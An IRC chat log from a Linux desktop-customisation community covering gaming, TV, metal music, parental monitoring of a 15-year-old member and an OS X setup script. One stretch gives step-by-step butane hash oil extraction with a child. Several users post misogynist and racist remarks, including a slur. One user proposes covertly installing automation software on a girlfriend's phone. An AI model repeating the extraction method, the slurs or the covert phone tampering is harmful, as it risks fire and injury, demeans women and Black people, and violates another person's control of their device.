20:17     NeoTerra │  yeah see that could be problematic
20:17         BigE │  cause doing that net'd better results than using 8
20:17     NeoTerra │  oh yeah
20:17     NeoTerra │  weird
20:17         BigE │  yeah
20:17         BigE │  I know I have 8 cores
20:17         BigE │  lul
20:18     NeoTerra │  did you do the thing for RAM
20:18         BigE │  however, I was thinking last night that it might be a server thing, cause on one server I was getting almost 60 on Ultra with no AA, and on another getting lik 20
20:19     NeoTerra │  oh did you not try this on a local box?
20:19         BigE │  I dont think I have any options set for RAM
20:19     NeoTerra │  *local game
20:19         BigE │  the weirder thing is that if I run the showcases, I get higher overall CPU usage, and the game is way smoother than anything else
20:20     NeoTerra │  yeah showcases work super well for me
20:20     NeoTerra │  haven't tried online actually
20:20         BigE │  so I think that perhaps their MP multicore code is just shit
20:20     NeoTerra │  could be
20:20         BigE │  you should do that
20:20         BigE │  lul
20:20     NeoTerra │  we should try it on a server hosted by your or me
20:20     NeoTerra │  just the two of us
20:20         BigE │  oh yeah, I can totally do that
20:20         BigE │  extra computer and all
20:20         BigE │  ummm
20:20         BigE │  when you wanna do it?
20:20     NeoTerra │  could be a thing where the more players there are, the laggier it gets
20:20     NeoTerra │  depends, you free now?
20:21         BigE │  I am trying to work out a bug with Xboomx right now
20:21         BigE │  give me like, 30 minutes?
20:21     NeoTerra │  kk I should still be free then

20:26        tbuck │  joom: what was that game you mentioned one time? i think it was in alpha still, some space game inspired by DF
20:27         joom │  Starforge. It's inspired by Minecraft and Metroid
20:27         joom │  and like, a lotta other games
20:28        tbuck │  ah nice, thanks

20:29         joom │  I've got it, but only two people on my Steam have it
20:29         joom │  And they never play it
20:34     NeoTerra │  joom what are you talking about?
20:35         joom │  Starforge
20:35     NeoTerra │  ah
20:35        kirby │  It looks like Terraria.
20:36         joom │  It's like Minecraft in space
20:36         joom │  But way funner
20:37        tbuck │  starbound reminds me of terraria, i havent played that one yet though
20:40        tbuck │  i might buy that and faster than light looks interesting too
20:43         BigE │  tbuck: FTL is a lot of fun
20:43         BigE │  and addictiing
20:43        tbuck │  good
20:43        tbuck │  its cheaper than ever right now too
20:52         BigE │  NeoTerra: I sold all my stupid fucking steam trading cards yesterday
20:52         BigE │  made like, 2.25 from undercutting the trending price by 1 cent
20:52         BigE │  im so baller
20:53         joom │  You can sell those?
20:53         BigE │  yes
20:53         BigE │  thank god
20:54        kirby │  There are a few games I want that I'm like 50p short on, I should sell the cards.
20:54         joom │  Because I'm getting sick of seeing them pop up in my inventory any time I play a game for even five minutes
20:54     NeoTerra │  lol I should sell mine too
20:54     NeoTerra │  BigE you ready to try arma soon?
20:54         BigE │  and Valve has made the selling process way quicker
20:55         BigE │  NeoTerra: yeah, just waiting for apt-get to finish, then imma reboot and go setup my laptop for server
20:55         BigE │  joom: you wanna play arma 3 with us?
20:55         joom │  sure

22:07       zygotb │  I'm trying Whonix
22:07       zygotb │  In a VM.
22:08       zygotb │  It's basic anonymity for point-click-idiots such as myself.
22:10       zygotb │  My kid made some nice BHO the other day.

22:12       zygotb │  I improved on his design, inverting the Gatorade bottle, adding a coffee filter to a cap with several small holes drilled into the cap.
22:12       zygotb │  Whonix is made specifically to be used in Vbox.
22:15       zygotb │  We packed 4 1qt Gatorade bottles with some trim he got from a friend.
22:15       zygotb │  Then sent 3 canisters of butane through each weed-filled bottle.
22:15         quit │  kirby
22:16       zygotb │  Caught the stuff dripping from the inverted gatorade bottles into a pyrex bowl.

22:20        tbuck │  joom: me too
22:20        tbuck │  last fest i was at i was trying to get some bubble hash, everyone looking at me crazy trying to sell me overpriced BHO. 
22:22         joom │  I love making it
22:22         joom │  So much cleaner than a blast tube
22:22         joom │  And a pebble will put you in space
22:23       zygotb │  The best I've had was some of my own grown in a glass pipe and lit with a glowing red-hot glass rod.
22:23       zygotb │  "Hot-knifing" is what my friend called it.
22:23        tbuck │  sounds a lot easier than hotknifing tho.. thats like a two man job
22:23       zygotb │  He's glassblower
22:24       zygotb │  He's got a few kilns, various torch setups...
22:25       zygotb │  The first BHO I'd seen, a few years ago, the dude made it using a cardboard tube.
22:25        tbuck │  ask him to make you a glass extractor.. those are what the kids use around here
22:26        tbuck │  small and efficient
22:26       zygotb │  The stuff was nowhere as clean looking as the stuff I have now.
22:28       zygotb │  I like that it can be made with everyday trash, such as empty plastic drink containers.

03:10     aqualung │  started watching community
03:10     aqualung │  is funny
03:11        tbuck │  yeah that wasnt bad
03:11         BigE │  first 3 seasons are good
03:11        tbuck │  theres a new cartoon on adult swim called rick and morty
03:11        tbuck │  its my new shit
03:11         BigE │  fourth one is 95% shit
03:11        tbuck │  drunk ass crazy scientist 
03:12         BigE │  is it animated?
03:12        tbuck │  yeah

03:15        tbuck │  what you'd expect from adult swim kinda crazy
03:15     aqualung │  adventure time meets regular show?
03:16        tbuck │  havent watched much adventure time but theres a few voice actors from that show i think
03:17     aqualung │  for today on "movies i started watching on netflix but gave up because they were garbage" - this http://www.imdb.com/title/tt2175184 (titties of a woman who looks like a transsexual nic cage for like 20 minutes in the beginning)
03:17         pico │  Title: Earthkiller (Video 2011) - IMDb (at www.imdb.com)
03:17     aqualung │  then i just watched community
03:18        tbuck │  lol
03:18         BigE │  2.1/10
03:18         BigE │  sounds classy as fuck
03:20         BigE │  anyone used firefox sync before?
03:20     aqualung │  tried but meh
03:20     aqualung │  back in firefox 3.6 days tho
03:20         BigE │  cause I am thinking about using it for all my bookmarks and stuff
03:20         BigE │  cause it is all done with clientside encryption
03:20         BigE │  lol
03:20         BigE │  >FF 26 now
03:21        tbuck │  BigE: i used to use it without trouble
03:21         BigE │  okay
03:21        tbuck │  tried it again after a few years
03:21         BigE │  I will give it a shot
03:21     aqualung │  holy fuck she does look like nic cage!
03:21        tbuck │  and its hasnt been syncing at all... i mighta set it up wrong
03:22     aqualung │  i gave up after it took her 20 minutes to find clothes
03:22         BigE │  well, I am more concerned with the privacy/security
03:22     aqualung │  run your own server then
03:22         BigE │  and it looks like everything is AES-128 and HMAC done on the client side
03:22        tbuck │  ah, i cant really say anything about that
03:22         BigE │  with mozilla simply brokering a transfer
03:22         BigE │  so that is secure enough for me
03:23        tbuck │  i dont sync/store anything on ff i wouldnt want to anyway
03:23       libbro │  tbcktu: You can do it on your own server.
03:24       libbro │  Or back it up manually
03:24       libbro │  Pretty simple if you'd ask me.
03:25         BigE │  it is impractical to be copying the .mozilla from one computer to the other every time I use them
03:25         BigE │  so this seems like the best way IMO
03:25         BigE │  short of running my own sync server
03:34       libbro │  TIL that Uganda was the second country to recognize a sign language in its constitution

19:21       libbro │  fenriz: I'll have to tell you the story
19:21       libbro │  My Dad once turned on my computer....
19:21       fenriz │  lol oh god
19:21       libbro │  Saw GRUB and immediately got angry at me
19:21       fenriz │  hahahaha
19:21       fenriz │  oh dear
19:21       fenriz │  poor poor libbro 
19:22       fenriz │  i take it that he is used to seeing the flashy windows start screen
19:22       libbro │  He asked me, "What is this DOS prompt doing on the computer?"
19:22       libbro │  Yep
19:22       libbro │  Then it automatically launched Debian after 3 secs and...
19:22       libbro │  I didn't use a splash screen
19:22       libbro │  So he saw all of the init shit and thought I was hacking
19:23       Ypnose │  haha
19:23       fenriz │  hzhahaha
19:23       libbro │  He asked me what "Debian" was and I said
19:23       libbro │  It is an operating system
19:23       fenriz │  this is so bad
19:23       libbro │  He asked me where I got it from
19:23       fenriz │  "YOU TOO GOOD FOR WINDOWS NOW, MOTHERFUCKER?!"
19:23       libbro │  and I said online
19:23       libbro │  Then he really got angry
19:23       fenriz │  :/
19:24       libbro │  He asked why I didn't use Windows like normal people
19:24       libbro │  And I said
19:24       libbro │  Because I prefer "L00nix"
19:24       fenriz │  say
19:24       libbro │  Then he went on a rant about how I shouldn't install other OSes to hack into stuff
19:24       fenriz │  what does your dad do?
19:25       libbro │  Biostatistics
19:25       fenriz │  what!
19:25       fenriz │  someone in that field with that education
19:25       fenriz │  should be more opene minded
19:25       libbro │  I know..
19:25       fenriz │  esp with stats i'd imagine he's at least herad of linux
19:25       fenriz │  and "R"
19:26       shtols │  If my dad touches my computer, he is dead meat.
19:26       shtols │  Actually, everybody is dead meat.
19:26       libbro │  cWhy?
19:26       fenriz │  that sounds too serious...
19:26       Ypnose │  I would love to see my dad trying to use dwm
19:26       Ypnose │  without the mouse
19:27       libbro │  I avoid using i3 when my Dad is around
19:27       libbro │  Because if he sees terminal windows he'll think I'm up to no good
19:27       fenriz │  same here
19:27       fenriz │  i'd imagine that my parents would age 30 years extra if they tried to figure out my bspwm
19:27       libbro │  So I use XFCE and GNOME when he's around
19:27       fenriz │  my mom is actually curious about my terminals this one time
19:27       fenriz │  and since she doesn't know what "hacking" even looks like
19:27       fenriz │  she completely thinks it's normla.
19:27       shtols │  libbro, how about explaining to him that you are not breaking into other people's computers? Oo
19:28       Ypnose │  fenriz: me too
19:28       Ypnose │  sometimes, I show her how the shell works
19:28       fenriz │  all my parents know is that i'm a developer
19:28       fenriz │  and that's what i do
19:28       libbro │  shtools: You don't know my Dad
19:28       fenriz │  and i buy them presents with m ymoney and it makes them happy 
19:28       fenriz │  haha
19:28       libbro │  He doesn't care
19:28       libbro │  He'll think I'm lying or something
19:28       Ypnose │  wow,
19:29       fenriz │  and i think the media/news does a lot of fear mongering
19:29       fenriz │  ONONYMOOSE
19:29       libbro │  ^
19:29       libbro │  Is your son sniffing paint thinner? It's the new trend with teens
19:30       fenriz │  lol
19:30       Ypnose │  actually, I like fuel smell
19:30    marcusant │  my parents don't give a fuck about what I do on my computer
19:31       libbro │  I behave myself, but he still doesn't seem to trust me
19:31    marcusant │  if I actually was hacking people they probably wouldn't care
19:31       fenriz │  the thing i dont do is use a shell in offee shops or libraries
19:31       libbro │  lol
19:31       fenriz │  i try to stick with chromium.
19:31       fenriz │  until i need to follow a tutorial
19:31       fenriz │  lol
19:31       libbro │  fenriz: Don't do that
19:31       libbro │  EVER
19:31       fenriz │  it's second nature to me to pop open a terminal
19:31       libbro │  I know
19:31    marcusant │  I use a terminal in one of my classes that I have to use osx in
19:31       fenriz │  lol
19:31    marcusant │  since the osx guis are so messed up
19:31       libbro │  But it's best you don't attract unwanted attention
19:32       fenriz │  yeah
19:32       fenriz │  i think the only time i use my shell is in my cs lectures.
19:32    marcusant │  It's ok in cs classes
19:32    marcusant │  because they will assume you are testing programs
19:32       fenriz │  yeeup
19:32       libbro │  ^
19:32     aqualung │  muh bsd
19:33       fenriz │  thing is though
19:33       fenriz │  if i can guarantee myself a eat facing the wall in a coffee shop
19:33       fenriz │  i will use it
19:33       fenriz │  hah
19:33    marcusant │  Well I got a nexus 5
19:33    marcusant │  it is amazing
19:33       fenriz │  niiiiice
19:34       fenriz │  libbro: how old are you anyway
19:34       fenriz │  is your coputer in the living trom?
19:34       fenriz │  room*
19:34         quit │  functorfun
19:35    marcusant │  mine is in my bedroom (because I am not living at home atm) but it is usually in a den or basement.
19:36       libbro │  fenriz: I'm 15 almost 16
19:36       fenriz │  hmm
19:36       libbro │  Mine is in my room
19:36       fenriz │  well i do remember my parents monitoring my usage pretty heavily back when iw as that age
19:37       fenriz │  and mine was in the living room
19:37       fenriz │  since they didn't want me watching porn
19:37       libbro │  When was this?
19:37       fenriz │  all the way up until i was 18
19:37         mxtm │  wat
19:37       fenriz │  i got my laptop from summer job
19:37       fenriz │  i'm like
19:37         mxtm │  are you serious?
19:37       fenriz │  "fuck this"
19:37       fenriz │  yeah
19:38         mxtm │  I sure hope you got around that ASAP
19:38       fenriz │  i didn't know about linux until last summer though
19:38       libbro │  Ah... that's surprising
19:38       fenriz │  yeah
19:38       fenriz │  so i guess i'm a late blomer
19:38       fenriz │  bloomer
19:38       libbro │  fenriz: How did your parents feel about you and BM?
19:39       libbro │  fenriz: I started last year also
19:39       fenriz │  my mom is like "can't you listen to stuff with more melody?"
19:39    vypr|sleep│  vypr
19:39       libbro │  lol
19:39       fenriz │  "what do you see in this?"
19:39       fenriz │  i play the piano as well
19:39       fenriz │  since i was 9
19:39       fenriz │  and my mom is like "can't you listen to the stuff you play instead?"
19:40       fenriz │  i explained to her it's also similar to the reason why people enjoy horror films
19:40       libbro │  Recently, I was listening to Hot Cross
19:40       libbro │  and my Dad came in
19:40       libbro │  And asked if it was "Devil music"
19:40    marcusant │  seriously your parents care if you watch porn?
19:40    marcusant │  that sucks
19:40       fenriz │  hahaha
19:40       libbro │  I said no
19:41       libbro │   and he said, "then what are they saying
19:41       fenriz │  sometimes libbro , i can't help but imagine you as the only black guy on this planet wearing skinny jeans
19:42       fenriz │  libbro: http://2.bp.blogspot.com/-aHzw8VyYXsM/UHTelgkxtFI/AAAAAAAAAHw/KSIn_qKtLGM/s1600/burzum.jpg
19:42    marcusant │  how is that even possible
19:42       libbro │  fenriz: lol
19:43       libbro │  Then he said I should listen to "normal music" like...
19:43       libbro │  *pop* music
19:43       fenriz │  hahaha
19:43       libbro │  Many black people where skinny jeans
19:43       fenriz │  i wear a lot of band t shirts
19:43       libbro │  That I know of
19:43       fenriz │  my mom thinks i buy too much of the similar shirts
19:43       libbro │  fenriz: I wish I had some
19:43       fenriz │  to her, all black metal logos + black background look the same
19:44       fenriz │  and she's lik e"you need variety"
19:44       libbro │  lol
19:44       libbro │  "It's just sqiggles and blood and black!"
19:44       fenriz │  lol wtf, seriously?  it's rare enough to see a black person where i live.  let alone them weraing skinnes.
19:44       fenriz │  haha yeeup!
19:44       libbro │  fenriz: I wear slim fit jeans mostly
19:45       fenriz │  those are pretty nice, yeah. 
19:45       fenriz │  that's what i wear.
19:45       libbro │  Muh nigga
19:45       fenriz │  btw, how come you dont have band shirts?
19:45       fenriz │  i think they're pretty cool.
19:45       libbro │  fenriz; I want some
19:45       fenriz │  which two bands, if you were to pick?
19:45       libbro │  But I'd probably get in trouble for wearing them
19:45       fenriz │  i have a darkthrone and a bathory one
19:45       fenriz │  and in highschool i had a CoF (3edgy5mme)
19:45       libbro │  Death and Agoraphobic Nosebleed
19:45       fenriz │  i regretted even spending money on CoF
19:45       fenriz │  i threw it out promptly
19:45       fenriz │  i have a dimmu burger one but i got bored of em.
19:46       libbro │  No Napalm Death and Agoraphobic Nosebleed
19:46       fenriz │  Death is a good choice :D
19:46       fenriz │  daaamn
19:46       fenriz │  not even possessed?
19:46       libbro │  I like them
19:46       libbro │  But their name is too generic
19:46       fenriz │  you more of a DM guy than BM?
19:46       libbro │  I don't know
19:46       fenriz │  sweden is thatta-way 
19:46       fenriz │  gtfo muh norways.
19:46       libbro │  I listen to mostly grindcore TBH
19:46       libbro │  I used to listen to a lot of DM
19:46       libbro │  Mostly American DM
19:46       fenriz │  FLORIDA SCENEEEE
19:47       libbro │  I listen to Swedish melodeath
19:47       fenriz │  it's hard for me to stomach DM.  
19:47       libbro │  though
19:47       fenriz │  dont know what it is.
19:47       libbro │  Melodeath?
19:47       fenriz │  oh no, 
19:47       libbro │  I also listen to a lot of skramz now
19:47       fenriz │  i know melodeath
19:47       fenriz │  i just don't know why i can't stomach DM in general.
19:48       libbro │  Oh, maybe it's too heavy, it takes time to get used to the heavy riffs and stuff
19:48       fenriz │  hahaht
19:48       fenriz │  too heavy was never an issue ;)
19:48       libbro │  Oh..
19:48       fenriz │  i really enjoy doom
19:48       libbro │  I LOVE DOOM
19:48       libbro │  What are your favorite bands?

19:50       libbro │  Like stoner doom?
19:50       libbro │  I mostly listen to funeral doom and some epic doom
19:50       fenriz │  yeah
19:50       libbro │  I do listen to EW though
19:50       fenriz │  they are hard to ignore haha
19:50       libbro │  Yep
19:50         joom │  Why do people listen to doom?
19:51       libbro │  Because it's atmospheric
19:51       fenriz │  and heavy
19:51       fenriz │  heaviest**
19:51         joom │  Exactly. It's like listening to bees drone.
19:51       libbro │  joom: Doom metal =/= drone metal
19:51         joom │  I didn't say it did
19:52       libbro │  Drone metal = doom metal though
19:52         yrmt │  what
19:52         joom │  I've listened to it all before.
19:53       libbro │  yrmt: Drone metal is a subgenre of doom
19:53       libbro │  fenriz: Trying to get muh waifu to listen to metal, not sure how to do so though
19:54     aqualung │  yrmt: what about prog metal
19:54         yrmt │  meh
19:54         joom │  It's so boring
19:54       libbro │  What about mathcore?
19:54       Ypnose │  nobody likes Trance here?
19:55       fenriz │  give her introductiory bands
19:55       fenriz │  like iron maiden?
19:56       libbro │  Good idea
19:56       fenriz │  and like
19:56       fenriz │  if she is into something
19:56       fenriz │  say skateboarding for example
19:56       fenriz │  try to find a montage video of skaters
19:57       fenriz │  to a good metal song
19:57       fenriz │  tha's what hooked one of my friends haha

19:59       fenriz │  :(
19:59       libbro │  fenriz: Probably not
20:00       fenriz │  your parents sound super conservating.
20:00       libbro │  Not really...

20:06       libbro │  Theravada or the other one?
20:06       libbro │  Plus, I'd take Buddhism over Christianity any day
20:07       fenriz │  i have no clue what they are
20:07       fenriz │  but they tried to drag me there
20:07       fenriz │  and i fought tooth and nail
20:07       fenriz │  buddhism is rather tame
20:07       fenriz │  we just set ourselves on fire
20:07       fenriz │  we are the emo-est of religions haha
20:08       libbro │  lol

01:08  thang1thang │  proofs book for what subject?
01:09     NeoTerra │  my mathematical proofs course
01:09  thang1thang │  figured it was math. Mathematical proofs course sounds like hell lol. Don't they have a textbook for it? (assuming, of course, it's actually useful...)
01:10     NeoTerra │  they do, but as you guessed, it's useless...
01:11         shix │  NeoTerra: your gf buys you skinny jeans..?

01:20     NeoTerra │  yeah I know what you mean
01:20  thang1thang │  That's skinny jeans, yeah, but it doesn't look bad when you're that skinny :p

01:44      bottomy │  yeh
01:44         BigE │  but the wrapper I use for it requires it
01:45         BigE │  took me forever to figure that out
01:45         BigE │  god damn
01:45  thang1thang │  I took only one quarter of intro to programming and I'm already having to re-wire my brain to fix some of the brain dead stuff my professor does
01:45  thang1thang │  Wrapper for what? 
01:45     NeoTerra │  >ricing
01:45         BigE │  I use a wrapper for dmenu called Xboomx
01:45  thang1thang │  >ricing is best icing
01:45      fenriz1 │  hahaha
01:45         BigE │  all it does is sort items based on how often they get used
01:46         BigE │  so if I search for iceweasel, icedove will come up first, but since I use iceweasel more, it will put it infront of it in the list anyways
01:46  thang1thang │  oh that sounds cool 
01:46         BigE │  launchers are the best thing ever
01:47         BigE │  yeah, I thought it was pretty awesome

01:49  thang1thang │  hook 'em up to a razzleberry pi and then set it so that whenever it hears a certain soundwave (e.g. song) it starts flipping light colors all techno like
01:50  thang1thang │  and then nab your girlfriend's phone, and install tasker on it and set it to whenever she arrives at home (connects to home wifi) it sends a command to the computer to turn the speakers onto 100 volume, and start playing "never gonna give you up"

05:34        tbuck │  theres some good looking lesbos but for the most part, meh.
05:34        tbuck │  im at good odds for having a threeway tho
05:34         shix │  NeoTerra: most of them are ugly. ONE time, I saw this good looking girl, easily a 9/10 go up to some girl(2/10) and make out with her.
05:35         shix │  it was gross
05:35         mxtm │  lol.
05:35     NeoTerra │  I couldn't do a threeway
05:35     NeoTerra │  mainly because I only really hook up with people who I'm in a relationship with
05:35     NeoTerra │  and threeways seem weird
05:35        tbuck │  with lesbos itd be pretty fun
05:35        tbuck │  chill as fuck
05:36        tbuck │  theyd be comfortable with each other n shit
05:36         shix │  NeoTerra: I've been invited to threeways
05:36         shix │  i cant do it man

05:36         mxtm │  wat
05:36        tbuck │  get in there
05:36     NeoTerra │  I did the whole hookup with random girls thing in high school
05:36     NeoTerra │  I find it just becomes meaningless
05:37        tbuck │  lol every rando girl ive hooked up with has been more trouble than theyre worth
05:37        tbuck │  sluts
05:37     NeoTerra │  yup
05:37     NeoTerra │  also I don't like putting my dick in some bitch's vagina if I don't trust her
05:37     NeoTerra │  imagine all the guys she's been with
05:37     NeoTerra │  nasty
05:38         shix │  i know that feeling
05:38         shix │  thats why i only do virgins
05:38        tbuck │  lol shix we dont get that luxury anymore
05:38         shix │  its a different feel man
05:38     NeoTerra │  monogamy for the win
05:39         vypr │  Oh boy, OUYA system update.
05:40         shix │  You're lucky Neo, you got a gf who is apparently trust worthy, mature, and I'm assuming good looking and not black
05:40         shix │  now all you have to do is sell her to the black market for a couple steam games
05:41     NeoTerra │  lol no
05:41     NeoTerra │  I don't want to fuck up my relationship
05:42     NeoTerra │  I happen to like it

05:45     NeoTerra │  Personally I find polyamory to be delusional
05:47         shix │  same
05:48         mxtm │  i know someone who is polyamorous
05:48         mxtm │  they're not delusional
05:48         mxtm │  and it works for them and their partners so
05:48         mxtm │ shrugs
05:50         shix │  yeah, fuck that lol
05:51     NeoTerra │  I just think they're deluding themselves
05:51     NeoTerra │  that's all
05:51     NeoTerra │  you will always like one person more than the other
05:51     NeoTerra │  that's just a universal rule
05:52         shix │  and fuck her more than the other
05:52     NeoTerra │  and want to spend more time with her vs others
05:52     NeoTerra │  etc
05:52     NeoTerra │  I think it's a recipe for disaster, because you get attached to the person, and then they don't get attached to you, and you feel shitty
05:53         mxtm │  I mean I KNOW it's not for me
05:53         mxtm │  and I don't completely understand it
05:54         mxtm │  b/c monogamy is swaggy
05:54         mxtm │  and one person is nice
05:57         shix │  NeoTerra: so is your gf white?

08:40         mxtm │  it's great
08:41  thang1thang │  I've been on one of those dumb adhd kicks for like 3 days now. I've gotten it into my head that I need to create a bash script that will completely automate the installation of command line tools, pkgsrc, a billion packages that I need and all my applications as well as apply terminal tweaks and shit like that
08:41  thang1thang │  so I haven't been getting enough sleep for a while...
08:41         mxtm │  for what, Arch?
08:41  thang1thang │  Oh I'd be done already if it was Arch
08:41  thang1thang │  it's os x...
08:42         mxtm │  oooh lol
08:42  thang1thang │  yeaahhh
08:42  thang1thang │  Took forever to get even the fucking command line tools...
08:42  thang1thang │  Everything wants to be through a GUI and shit
08:43  thang1thang │  I finally downloaded the .dmg off of the apple site, ripped the information out of it through the terminal, and put it in a git hub repository for lack of a better place to put it, and I'm going to curl the information to my hard drive and install it through terminal and then the rest of it should be fairly easy in comparison 
08:43         mxtm │  eh
08:43         mxtm │  OS X ain't worth the trouble
08:43         mxtm │  I have a MBP and I just use Arch

08:43         mxtm │  http://a.pomf.se/txzrzc.png
08:44  thang1thang │  Yeah, I have a MBP as well. I really like OS X though, it's compatible with adobe apps, which I use fairly frequently
08:44         mxtm │  aaah I see
08:44  thang1thang │  and it's compatible with iTunes (although I don't actually give a shit about itunes anymore because the only thing that uses it anymore is my iTouch that's plugged into the car as my radio and never goes anywhere)
08:44  thang1thang │  Yeah. If it wasn't for my hatred of rebooting I'd probably just use arch...
08:45  thang1thang │  dat wm setup though, is gorgeous
08:45  thang1thang │  zsh > bash
08:45  thang1thang │  fiteme 
08:46         mxtm │  huh? Arch only requires you to reboot w/ kernel udpates
08:46         mxtm │  heh, thanks bb
08:46  thang1thang │  lol, yeah I know. I was more or less referencing that I would have to reboot every time I wanted to use a mac only application 
08:47         BigE │  isnt there an OSX application emulator now though/
08:47         BigE │  ?
08:47         mxtm │  aah I see

08:47         mxtm │  and BigE, I don't think so
08:47         mxtm │  you can use VBox
08:47  thang1thang │  but I'll be damned if I'm going to run photoshop on a fucking emulator

09:45         mxtm │  and it's gr8
09:45  thang1thang │  but I'm pretty severe hard of hearing, so I was able to compress everything to 128kb vbr AAC
09:46  thang1thang │  and no diff in audio quality to me :p
09:46         joom │  Do you even into obscure formats?

09:46  thang1thang │  to be honest, why would any of you guys use anything else but flac for lossless?
09:47         yrmt │  alac
09:47  thang1thang │  are there any benefits to others?
09:47         yrmt │  it works in itunes and in ffmpeg

09:47         yrmt │  mpd, cmus, ..
09:47  thang1thang │  flac works in android though :p
09:47         mxtm │  imagine what these people would like, look like

11:14  thang1thang │  how's it going?
11:23        kirby │  Good, not up to much, you?
11:24  thang1thang │  Trying to figure out how to finish up my shell script
11:24  thang1thang │  I mean, it's only 2:20am...
11:24  thang1thang │  But yeah, dis script will be the shit if I ever get it to work right
11:24        kirby │  Haha.
11:27  thang1thang │  so what I have so far
11:27        kirby │  What will it do?
11:28  thang1thang │  is I'm using OS X (fuck me, right?)
11:28        kirby │  Haha.
11:28  thang1thang │  so I want to set up an shell script that I just run it as sudo
11:28        kirby │  Ask yrmt or phryne :p
11:28  thang1thang │  and then it'll use curl to pull from my git repostery
11:28  thang1thang │  and it'll pull all my dot files, config files, blah blah blah
11:29        kirby │  Noob question: Why not use 'git clone'?
11:29  thang1thang │  Because mac doesn't come with command line tools pre-installed
11:29        kirby │  Oh.
11:29        kirby │  Continue.
11:29  thang1thang │  And I'm far too fucking lazy to write an install script and having to actually do work before I can use said script :p
11:29        kirby │  Put in effort now so you can use little effort later :p
11:30        kirby │  Is the programmer's way.
11:30  thang1thang │  anyway... I curl from my git repostory. Then I curl from another repostory that's a dropbox_uploader script, super cool
11:30  thang1thang │  the script allows me to download off my dropbox any file through the cmmand line
11:30  thang1thang │  only problem. First time run through requires a manual GUI setup, boooooooring.
11:31  thang1thang │  so I did the setup once, made the config file, and dropped it into my git
11:31  thang1thang │  so now I have the sh script set to run the dropbox download script with a -file paramater that uses the config file, so theoretically no setup is needed
11:31  thang1thang │  it'll download my command line tools .dmg (because I can't just curl from apple. They demand that you log in first...)
11:32  thang1thang │  theeen I mount through terminal, and use the installer command
11:32  thang1thang │  and FINALLY
11:32  thang1thang │  command line tools is installed
11:32  thang1thang │  I am now at step zero of linux: An actual fucking usable machine
11:33        kirby │  saveosx.org
11:33  thang1thang │  Next comes git clones! I'm getting to that :p
11:33        kirby │  Is a project being worked on by yrmt and phyrne, may be of use @p
11:33        kirby │  *:p
11:33  thang1thang │  I clone into pkgsrc from the saveosx.org thing
11:33        kirby │  Ah ok.
11:33  thang1thang │  and build it on my computer
11:33        kirby │  This is like a fun story.
11:33  thang1thang │  change my path files, etc get it all done
11:33  thang1thang │  (this is actually where I am now in making the sh file... Not 100% sure on all the syntax of my commands but whatever)
11:34         quit │  venam
11:34  thang1thang │  After that, then I can just run a million commands like pkgin install vim, git, xquartz, zsh...
11:35  thang1thang │  then I'll probably install homebrew if I can't find a better way
11:36  thang1thang │  but then I'd get homebrew -> cask
11:36  thang1thang │  and use that to blow through and install all my GUI apps like firefox, adobe apps, etc
11:36  thang1thang │  ohrite, I need to install latex too, that'll be through pkgin
11:36  thang1thang │  I'll get 2bwm (a window manager) installed as well, lots of stuff like that
11:37  thang1thang │  then I just need to add some other scripts to the /startup folder (like the no shadows script) and make sure some other customization settings are set like useful terminal tweaks...
11:37  thang1thang │  and I SHOULD be set after that ._.
11:38        kirby │  Sounds good.
11:38        kirby │  Hassle, but it'll all be worth it :p
11:38  thang1thang │  the thing that's bugging me now is I can't figure out how to edit the path variable
11:38        kirby │  How do you test it though?
11:38  thang1thang │  I mean, you can edit by typing vim <file> and doing it that way
11:38  thang1thang │  but that requires user input...
11:38  thang1thang │  And how do I test it? I just double check REALLY good that everything's right
11:38  thang1thang │  and then I back up my computer and re-install the OS and try it out...
11:39  thang1thang │  repeat step 3 as necessary :p
11:39        kirby │  Well good luck then.
11:39  thang1thang │  thanks
11:39  thang1thang │  working on anything interesting yourself?
11:39        kirby │  I tried making a really bad setup script when I first used Linux.
11:39        kirby │  I used it once and it caused a hell of a lot of hassle.
11:39        kirby │  I think I just reinstalled in the end.
11:39  thang1thang │  lol
11:40  thang1thang │  what did you do wrong?
11:40        kirby │  Hmm.
11:40        kirby │  I had a load of .debs I wanted.
11:40        kirby │  So I copied them over, not accounting for the fact that the diretories didn't exist on a fresh system.
11:40  thang1thang │  lol ouch
11:40        kirby │  And that ~ under sudo was /root/ (I think).
11:40  thang1thang │  it happens
11:41        kirby │  Indeed.
11:41  thang1thang │  mmm, what are the .debs again?
11:41        kirby │  At the momement I'm working on my school project, an ncurses file manager.
11:41  thang1thang │  oh cool
11:41        kirby │  It segfaults on moving directories.
11:41        kirby │  Cinnamon mostly.
11:41  thang1thang │  the school project segfaults?
11:42        kirby │  Yeah.
11:42  thang1thang │  welp
11:42  thang1thang │  at least it compiles...kinda...
11:42        kirby │  Yeah.
11:43        kirby │  It's probably not too much bother, it's likely a dumb mistak.
11:43  thang1thang │  yeahyup
11:43  thang1thang │  I had a the dumbest mistake ever for a school assignment
11:43        kirby │  Like that spelling lol.
11:44  thang1thang │  We had to take 3 pre-written programs and organize them into a menu function
11:44  thang1thang │  really freaking easy
11:44  thang1thang │  Except my professor wrote it...
11:44        kirby │  Oh.
11:44  thang1thang │  and his programming practices died out in the 80s
11:44        kirby │  lol, mine is pretty poor.
11:44  thang1thang │  He used system("PAUSE"); like it was going out of style
11:44  thang1thang │  and took every opportunity possible to avoid curly braces, so that you couldn't follow nested for loops for shit
11:45        kirby │  He's very poor at naming variables, he's given us stuff with 'a =', 'b = ' and all that.
11:45  thang1thang │  and to top it off he put a (getchar() !=.eof() ) inside a while loop
11:45  thang1thang │  .eof in a fucking while loop
11:45  thang1thang │  ;-;
11:46         join │  engraze
11:46         mode │  +v engraze
11:46        kirby │  Ugh.
11:46  thang1thang │  but yeah, I'm sorry about ya variable names lol
11:46  thang1thang │  best part? Best part
11:46      engraze │  god, guys
11:46      engraze │  long fucking time no see
11:46  thang1thang │  I couldn't get the script to write correctly for whatever reason
11:46  thang1thang │  And hey there!
11:46      engraze │  haio
11:46  thang1thang │  I had re-written out the system("PAUSE") shit
11:46  thang1thang │  but the while looped .eof was giving me such a hard time
11:47  thang1thang │  apparently *nix systems use ^M for their end line characters or whatever it was
11:47  thang1thang │  and windows doesn't
11:47  thang1thang │  so the .eof thing was flipping it's shit at my input
11:47  thang1thang │  However, I just turned it in even though it didn't compile correctly
11:47  thang1thang │  Because I knew my professor uses codeblocks on windows, and it compiles just fecking fine on there -_-
11:48  thang1thang │  spent 3 hours on that .eof trying to fix it...
11:48        kirby │  At least yours knows C, mine is a Python/VB kind of guy :p
11:48  thang1thang │  ohgod
11:48  thang1thang │  yeah he teaches c++
11:49  thang1thang │  he teaches almost every single CS course at my university in fact -_-
